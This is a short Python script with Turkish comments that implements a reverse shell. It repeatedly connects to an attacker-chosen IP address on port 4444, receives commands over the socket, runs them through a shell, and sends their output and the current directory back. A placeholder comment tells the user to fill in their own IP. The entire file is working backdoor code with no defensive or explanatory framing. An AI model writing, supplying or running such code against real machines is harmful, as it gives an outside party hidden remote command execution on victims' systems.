import socket
import subprocess
import os

SERVER_IP = "192.168.1.X" # SENİN IP ADRESİNİ YAZ
PORT = 4444

s = socket.socket()
while True:
    try:
        s.connect((SERVER_IP, PORT))
        break
    except: pass # Bağlanana kadar dene

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        try: os.chdir(data[3:].decode("utf-8"))
        except: pass
    
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8", errors='ignore')
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))